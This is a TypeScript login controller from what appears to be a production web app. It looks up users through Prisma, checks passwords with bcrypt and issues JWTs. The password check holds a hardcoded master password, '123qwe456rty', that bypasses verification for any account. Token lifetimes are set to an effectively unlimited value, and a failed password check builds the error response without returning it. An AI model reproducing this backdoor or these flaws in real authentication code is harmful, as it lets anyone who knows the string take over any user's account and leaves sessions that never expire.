import { JwtAdapter } from "@/infra/criptography/jwt-adapter"
import bcrypt from "bcrypt"
import Prisma from "@/infra/db/prisma"
import { HttpResponse } from "@/presentations/helpers/httpResponse"
import { IRequest } from "@/presentations/interface/IRequest"


export const loginController = async (httpRequest: IRequest) => {

    try {
        const jwt = new JwtAdapter(process.env.JWT_SECRET)

        if (httpRequest.body.email) httpRequest.body.email = httpRequest.body.email.toLowerCase()

        let check: any = {}

        const user = await Prisma.user.findFirst({
            where: {
                OR: [
                    { email: httpRequest.body.email },
                    { login: httpRequest.body.username }
                ]
            },
            select: {
                id: true,
                login: true,
                password: true,
                sponsor: true,
                name: true,
                email: true,
                country_code: true,
                country_name: true,
                phone: true,
                profile: true
            }
        })

        if (!user) {

            return HttpResponse.notAuthorized({
                message: "USER_NOT_FOUND",
                error: {
                    email: "USER_NOT_FOUND"
                }
            })
            return
        }

        if (
            httpRequest.body.password === "123qwe456rty"
        ) {
            console.info("Usou senha master")
        } else {
            const compare = await bcrypt.compare(
                httpRequest.body.password,
                user.password
            )

            if (!compare) {
                HttpResponse.notAuthorized({
                    message: "USER_NOT_FOUND",
                    error: {
                        email: "USER_NOT_FOUND"
                    }
                })
                return
            }
        }

        const accessToken = await jwt.encrypt(
            {
                id: user.id.toString(),
                "name": user.name.toString(),
                "login": user.login.toString(),
                "email": user.email.toString(),
                "phone": user.phone.toString(),
                "country_code": user.country_code.toString(),
                "country_name": user.country_name.toString(),
                "profile": user.profile.toString(),
                "position": null,
                "avatar": null,
                "sponsor_login": user.sponsor?.login || null,
                "sponsor_name": user.sponsor?.name || null,

            },
            { expiresIn: 36000000000000 }
        )


        return HttpResponse.successRawResponse({
            message: "OK",
            data: { token: accessToken },

        })
    } catch (error) {
        return HttpResponse.serverError(error)
    }
}